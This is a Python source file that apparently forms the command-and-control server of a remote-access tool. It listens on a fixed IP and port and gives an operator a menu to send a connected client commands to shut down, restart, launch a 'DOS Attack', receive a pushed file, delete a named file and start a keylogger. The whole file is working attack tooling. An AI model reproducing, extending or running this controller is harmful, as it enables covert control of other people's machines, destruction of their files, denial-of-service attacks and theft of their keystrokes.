import time
import socket
import os

# Server Code

def start_server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host = "10.250.6.47"
    port = 8080
    
    try:
        s.bind((host, port))
        print("\nWaiting for incoming connection...")
        s.listen(10)
        conn, addr = s.accept()
        print(f"\nClient is connected to the server now from address {addr}\n")
        
        while True:
            try:
                print("Waiting for command...")
                choice = input("1. Shutdown\n2. Restart\n3. DOS Attack\n4. Send File\n5. Remove File\n6. Keylogger\n7. Exit\nEnter your choice: ")
                
                if choice == "1":
                    conn.sendall("1".encode())
                    print("Shutdown command sent.")
                elif choice == "2":
                    conn.sendall("2".encode())
                    print("Restart command sent.")
                elif choice == "3":
                    conn.sendall("3".encode())
                    print("DOS Attack command sent.")
                elif choice == "4":
                    conn.sendall("4".encode())
                    file_path = input("Enter the file path to send: ")
                    
                    if os.path.exists(file_path):
                        file_name = os.path.basename(file_path)
                        file_size = os.path.getsize(file_path)
                        conn.sendall(f"{file_name}|{file_size}".encode())
                        print(f"File transfer command sent for file {file_name} with size {file_size} bytes.")
                        
                        # Wait for acknowledgment from client
                        ack = conn.recv(1024).decode()
                        if ack == "READY":
                            with open(file_path, "rb") as f:
                                while (data := f.read(1024)):
                                    conn.sendall(data)
                            print("File sent successfully!\n")
                        else:
                            print("Client not ready for file transfer.\n")
                    else:
                        print("File not found!\n")
                elif choice == "5":
                    conn.sendall("5".encode())
                    file_path = input("Enter the file path to remove on client: ")
                    conn.sendall(file_path.encode())
                    print(f"Remove file command sent for file {file_path}.")
                elif choice == "6":
                    conn.sendall("6".encode())
                    print("Keylogger command sent.")
                elif choice == "7":
                    conn.sendall("7".encode())
                    print("Exit command sent.")
                    break
                else:
                    print("Enter a valid choice.\n")
            except (socket.error, ConnectionResetError) as e:
                print(f"Connection lost: {e}")
                break
    
    except socket.error as e:
        print(f"Socket error: {e}")
    finally:
        if 'conn' in locals():
            conn.close()
        s.close()

if __name__ == "__main__":
    start_server()
